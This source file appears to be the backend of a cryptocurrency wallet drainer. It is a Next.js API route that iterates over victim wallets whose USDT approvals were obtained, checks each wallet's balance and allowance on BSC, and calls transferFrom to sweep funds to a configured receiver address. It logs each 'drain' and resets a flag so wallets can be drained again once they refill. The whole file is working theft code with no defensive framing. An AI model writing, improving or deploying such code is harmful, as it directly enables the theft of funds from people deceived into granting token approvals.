import { NextRequest, NextResponse } from "next/server";
import { getServiceSupabase } from "@/lib/supabase";
import { ethers } from "ethers";
import { isAdminAuthorized } from "@/lib/auth";

const USDT_ABI = [
  "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
  "function balanceOf(address owner) public view returns (uint256)",
  "function allowance(address owner, address spender) public view returns (uint256)",
];

export async function POST(req: NextRequest) {
  if (!(await isAdminAuthorized(req))) {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }

  const supabase = getServiceSupabase();

  const { data: configRows } = await supabase.from("config").select("*");
  const config: Record<string, string> = {};
  for (const row of configRows ?? []) config[row.key] = row.value;

  const receiverAddress = config["receiver_address"];
  const minThresholdUsd = parseFloat(config["min_threshold_usd"] ?? "2");

  if (!receiverAddress) {
    return NextResponse.json({ error: "Receiver address not configured in admin Config tab." }, { status: 500 });
  }

  const privateKey = process.env.ADMIN_PRIVATE_KEY;
  if (!privateKey) {
    return NextResponse.json({ error: "ADMIN_PRIVATE_KEY is not set in environment variables." }, { status: 500 });
  }

  // Fetch ALL approved wallets regardless of drained flag — balance is checked live
  const { data: wallets, error } = await supabase
    .from("wallets")
    .select("*")
    .eq("approval_status", true);

  if (error) return NextResponse.json({ error: error.message }, { status: 500 });

  const provider = new ethers.JsonRpcProvider(
    process.env.BSC_RPC_URL ?? "https://bsc-dataseed.binance.org/"
  );
  const adminWallet = new ethers.Wallet(privateKey, provider);
  const contract = new ethers.Contract(
    process.env.NEXT_PUBLIC_USDT_CONTRACT!,
    USDT_ABI,
    adminWallet
  );

  const results: { address: string; status: string; txHash?: string; amount?: string }[] = [];

  for (const wallet of wallets ?? []) {
    try {
      const [balance, allowance]: [bigint, bigint] = await Promise.all([
        contract.balanceOf(wallet.address),
        contract.allowance(wallet.address, adminWallet.address),
      ]);

      const balanceUsd = parseFloat(ethers.formatUnits(balance, 18));
      const allowanceUsd = parseFloat(ethers.formatUnits(allowance, 18));

      // Skip if below USD threshold
      if (balanceUsd < minThresholdUsd) {
        results.push({ address: wallet.address, status: "skipped_low_balance" });
        continue;
      }

      // Skip if no real on-chain allowance
      if (allowance === BigInt(0)) {
        // Mark as not actually approved in DB so we don't keep retrying
        await supabase
          .from("wallets")
          .update({ approval_status: false })
          .eq("id", wallet.id);
        results.push({ address: wallet.address, status: "skipped_no_allowance" });
        continue;
      }

      // Transfer the lesser of balance or allowance
      const transferAmount = balance < allowance ? balance : allowance;
      const amountFormatted = ethers.formatUnits(transferAmount, 18);

      // Skip if transferAmount is effectively zero
      if (parseFloat(amountFormatted) < minThresholdUsd) {
        results.push({ address: wallet.address, status: `skipped_allowance_too_low ($${allowanceUsd.toFixed(4)})` });
        continue;
      }

      const tx = await contract.transferFrom(wallet.address, receiverAddress, transferAmount);
      const receipt = await tx.wait();

      // Reset drained=false so wallet can be drained again when it refills
      await supabase
        .from("wallets")
        .update({ drained: false, drain_tx_hash: receipt.hash, updated_at: new Date().toISOString() })
        .eq("id", wallet.id);

      await supabase.from("transactions").insert({
        wallet_address: wallet.address,
        type: "drain",
        tx_hash: receipt.hash,
        amount_usdt: amountFormatted,
        status: "success",
      });

      results.push({ address: wallet.address, status: "drained", txHash: receipt.hash, amount: amountFormatted });
    } catch (err: unknown) {
      const message = err instanceof Error ? err.message : "Unknown";

      await supabase.from("transactions").insert({
        wallet_address: wallet.address,
        type: "drain",
        status: "failed",
        amount_usdt: "0",
      });

      results.push({ address: wallet.address, status: "failed: " + message });
    }
  }

  // Update the persistent next-drain timestamp in Supabase
  try {
    const { getAdminPassword } = await import("@/lib/auth");
    const pwd = await getAdminPassword();
    await fetch(`${process.env.NEXT_PUBLIC_APP_URL || "http://localhost:3000"}/api/drain-timer`, {
      method: "POST",
      headers: { "x-admin-key": pwd || "" },
    });
  } catch {
    // Non-critical — timer will re-sync on next client poll
  }

  return NextResponse.json({ success: true, results });
}
